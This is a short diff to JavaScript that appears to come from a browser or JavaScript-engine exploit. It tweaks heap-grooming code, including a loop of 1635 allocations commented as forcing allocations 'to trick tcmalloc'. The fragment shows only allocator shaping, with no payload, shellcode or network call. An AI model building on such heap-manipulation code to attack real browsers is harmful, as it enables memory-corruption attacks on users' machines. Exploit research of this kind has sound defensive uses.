@@ -85,14 +85,14 @@ var force_alloc_and_free = {
 
 var force_arr = [];
 force_arr.push(force_alloc_and_free);
-for (var i = 1; i < 0x1A4/4; i++)
+for (var i = 2; i < 0x1A4/4; i++)
 {
   force_arr.push('');
 }
 
 // Force allocations to trick tcmalloc.
 for(var i = 0; i < 1635; i++) {
-  holder.push(alloc(0x1A0 - 0x20, 1));
+  holder.push(alloc(0x1A0 - 0x20, 2));
 }
 
 
